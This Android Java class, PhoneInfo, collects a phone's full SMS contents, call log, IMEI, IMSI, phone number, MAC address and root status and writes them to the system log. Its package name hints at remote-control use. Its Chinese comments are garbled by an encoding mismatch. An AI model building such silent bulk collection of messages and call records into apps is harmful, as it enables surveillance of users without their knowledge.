/**
 * 
 */
package com.byc.control;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;



import android.app.Service;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.os.StatFs;
import android.provider.CallLog.Calls;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;

/**
 * @author byc
 *
 */
public class PhoneInfo {
	public String TAG = "byc001";//���Ա�ʶ��
	private static PhoneInfo current;
	 private Context context;
	 private PhoneInfo(Context context) {
		 this.context = context;
		 this.TAG=Config.TAG;
	 }
	    public static synchronized PhoneInfo getPhoneInfo(Context context) {
	        if(current == null) {
	            current = new PhoneInfo(context);
	        }
	        return current;
	    }
	    /** 
	     * ��ȡ���ж��� 
	     *  
	     * @return 
	     */  
	    public String getSmsInPhone() {  
	        final String SMS_URI_ALL = "content://sms/";  
	  
	        StringBuilder smsBuilder = new StringBuilder();  
	  
	        try {  
	            Uri uri = Uri.parse(SMS_URI_ALL);  
	            String[] projection = new String[] { "_id", "address", "person",  
	                    "body", "date", "type" };  
	            Cursor cur = context.getContentResolver().query(uri, projection, null,  
	                    null, "date desc"); // ��ȡ�ֻ��ڲ�����  
	  
	            if (cur.moveToFirst()) {  
	                int index_Address = cur.getColumnIndex("address");  
	                int index_Person = cur.getColumnIndex("person");  
	                int index_Body = cur.getColumnIndex("body");  
	                int index_Date = cur.getColumnIndex("date");  
	                int index_Type = cur.getColumnIndex("type");  
	  
	                do {  
	                    String strAddress = cur.getString(index_Address);  
	                    int intPerson = cur.getInt(index_Person);  
	                    String strbody = cur.getString(index_Body);  
	                    long longDate = cur.getLong(index_Date);  
	                    int intType = cur.getInt(index_Type);  
	  
	                    SimpleDateFormat dateFormat = new SimpleDateFormat(  
	                            "yyyy-MM-dd hh:mm:ss");  
	                    Date d = new Date(longDate);  
	                    String strDate = dateFormat.format(d);  
	  
	                    String strType = "";  
	                    if (intType == 1) {  
	                        strType = "����";  
	                    } else if (intType == 2) {  
	                        strType = "����";  
	                    } else {  
	                        strType = "null";  
	                    }  
	  
	                    smsBuilder.append("[ ");  
	                    smsBuilder.append(strAddress + ", ");  
	                    smsBuilder.append(intPerson + ", ");  
	                    smsBuilder.append(strbody + ", ");  
	                    smsBuilder.append(strDate + ", ");  
	                    smsBuilder.append(strType);  
	                    smsBuilder.append(" ]\r\n");  
	                } while (cur.moveToNext());  
	  
	                if (!cur.isClosed()) {  
	                    cur.close();  
	                    cur = null;  
	                }  
	            } else {  
	                smsBuilder.append("no result!");  
	            } // end if  
	  
	            smsBuilder.append("getSmsInPhone has executed!");  
	  
	        } catch (SQLiteException ex) {  
	            Log.d("SQLiteException in getSmsInPhone", ex.getMessage());  
	        }  
	        Log.i(TAG, smsBuilder.toString());
	        return smsBuilder.toString();  
	    }  
	    /** 
	     * ��ȡͨ����¼ 
	     */  
	    public String GetCallsInPhone() {  
	        String result = null;  
	        Cursor cursor = context.getContentResolver().query(  
	                Calls.CONTENT_URI,  
	                new String[] { Calls.DURATION, Calls.TYPE, Calls.DATE,  
	                        Calls.NUMBER }, null, null, Calls.DEFAULT_SORT_ORDER);  
	        boolean hasRecord = cursor.moveToFirst();  
	        int count = 0;  
	        String strPhone = "";  
	        String date;  
	  
	        while (hasRecord) {  
	            int type = cursor.getInt(cursor.getColumnIndex(Calls.TYPE));  
	            long duration = cursor.getLong(cursor  
	                    .getColumnIndex(Calls.DURATION));  
	            strPhone = cursor.getString(cursor.getColumnIndex(Calls.NUMBER));  
	            SimpleDateFormat dateFormat = new SimpleDateFormat(  
	                    "yyyy-MM-dd hh:mm:ss");  
	            Date d = new Date(Long.parseLong(cursor.getString(cursor  
	                    .getColumnIndex(Calls.DATE))));  
	            date = dateFormat.format(d);  
	  
	            result = result + "phone :" + strPhone + ",";  
	  
	            result = result + "date :" + date + ",";  
	            result = result + "time :" + duration + ",";  
	  
	            switch (type) {  
	            case Calls.INCOMING_TYPE:  
	                result = result + "type :����";  
	                break;  
	            case Calls.OUTGOING_TYPE:  
	                result = result + "type :����";  
	            default:  
	                break;  
	            }  
	            result += "\r\n";  
	            count++;  
	            hasRecord = cursor.moveToNext();  
	        }
	        Log.i(TAG, result); 
	        return result;
	        //textView.setText(result);  
	    } 
	    public String getBaseInfo(){
	    	 String text = "������Ϣ��" + 
	    		        "\n" + getTotalMemory() + 
	    		        "\n" + getAvailMemory() +  
	    		        "\n" + getInfo() +  
	    		        "\n" + getMacAddress() +  
	    		        "\n" + getCpuInfo() + 
	    		        "\n" + getPackage() + 
	    		        "\n" + isRoot(); 
	    	 return text;
	    }
	    /** 
	     * ��ȡ�������,�汾�����汾�� 
	     */
	    private String getPackage(){ 
	      try { 
	        String pkName = context.getPackageName(); 
	        String versionName = context.getPackageManager().getPackageInfo( 
	            pkName, 0).versionName; 
	        int versionCode = context.getPackageManager() 
	            .getPackageInfo(pkName, 0).versionCode; 
	        return "Package:" + pkName + "\nversionName:" + versionName + "\nversionCode:" + versionCode; 
	      } catch (Exception e) { 
	      } 
	      return null; 
	    } 
	      
	    /** 
	     * ��ȡ�ֻ��Ƿ�root��Ϣ 
	     * @return 
	     */
	    private String isRoot(){ 
	      String bool = "Root:false"; 
	      try{ 
	        if ((!new File("/system/bin/su").exists()) && (!new File("/system/xbin/su").exists())){ 
	          bool = "Root:false"; 
	        } else { 
	          bool = "Root:true"; 
	        }       
	      } catch (Exception e) { 
	      }  
	      return bool; 
	    } 
	      
	    /** 
	     * ��ȡandroid��ǰ�����ڴ��С  
	     */ 
	    private String getAvailMemory() {// ��ȡandroid��ǰ�����ڴ��С         
	      File path = Environment.getDataDirectory();  
	      StatFs stat = new StatFs(path.getPath());  
	      long blockSize = stat.getBlockSize();  
	      long availableBlocks = stat.getAvailableBlocks();  
	      return "��ǰ�����ڴ棺" + Formatter.formatFileSize(context, blockSize * availableBlocks); 
	      }   
	       
	    /** 
	     * ���ϵͳ���ڴ� 
	     */ 
	    private String getTotalMemory() {  
	      String str1 = "/proc/meminfo";// ϵͳ�ڴ���Ϣ�ļ�   
	      String str2;  
	      String[] arrayOfString;  
	      long initial_memory = 0;    
	      try {  
	      FileReader localFileReader = new FileReader(str1);  
	      BufferedReader localBufferedReader = new BufferedReader(  
	      localFileReader, 8192);  
	      str2 = localBufferedReader.readLine();// ��ȡmeminfo��һ�У�ϵͳ���ڴ��С   
	       
	      arrayOfString = str2.split("\\s+");  
	      initial_memory = Integer.valueOf(arrayOfString[1]).intValue() * 1024;// ���ϵͳ���ڴ棬��λ��KB������1024ת��ΪByte   
	      localBufferedReader.close();    
	      } catch (IOException e) {  
	      }  
	      return "���ڴ��С��" + Formatter.formatFileSize(context, initial_memory);// Byteת��ΪKB����MB���ڴ��С���   
	    }  
	       

	    /** 
	     * ��ȡIMEI�ţ�IESI�ţ��ֻ��ͺ� 
	     */ 
	    private String getInfo() {  
	       TelephonyManager mTm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);  
	        String imei = mTm.getDeviceId();  
	        String imsi = mTm.getSubscriberId();  
	        String mtype = android.os.Build.MODEL; // �ֻ��ͺ�  
	        String mtyb= android.os.Build.BRAND;//�ֻ�Ʒ��  
	        String numer = mTm.getLine1Number(); // �ֻ����룬�еĿɵã��еĲ��ɵ�  
	      return "�ֻ�IMEI�ţ�"+imei+"\r\n�ֻ�IESI�ţ�"+imsi+"\r\n�ֻ��ͺţ�"+mtype+"\r\n�ֻ�Ʒ�ƣ�"+mtyb+"\r\n�ֻ�����"+numer;  
	      }  
	    /** 
	     * ��ȡ�ֻ�MAC��ַ 
	     * ֻ���ֻ�����wifi���ܻ�ȡ��mac��ַ 
	     */ 
	    private String getMacAddress(){  
	        String result = "";  
	        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);  
	        WifiInfo wifiInfo = wifiManager.getConnectionInfo();  
	        result = wifiInfo.getMacAddress();  
	        return "�ֻ�macAdd:" + result;  
	      }  
	    /** 
	     * �ֻ�CPU��Ϣ 
	     */ 
	    private String getCpuInfo() {  
	        String str1 = "/proc/cpuinfo";  
	        String str2 = "";  
	        String[] cpuInfo = {"", ""}; //1-cpu�ͺ� //2-cpuƵ��  
	        String[] arrayOfString;  
	        try {  
	          FileReader fr = new FileReader(str1);  
	          BufferedReader localBufferedReader = new BufferedReader(fr, 8192);  
	          str2 = localBufferedReader.readLine();  
	          arrayOfString = str2.split("\\s+");  
	          for (int i = 2; i < arrayOfString.length; i++) {  
	            cpuInfo[0] = cpuInfo[0] + arrayOfString[i] + " ";  
	          }  
	          str2 = localBufferedReader.readLine();  
	          arrayOfString = str2.split("\\s+");  
	          cpuInfo[1] += arrayOfString[2];  
	          localBufferedReader.close();  
	        } catch (IOException e) {  
	        }  
	        return "CPU�ͺ�:" + cpuInfo[0] + "\nCPUƵ�ʣ�" + cpuInfo[1];  
	      }  

}
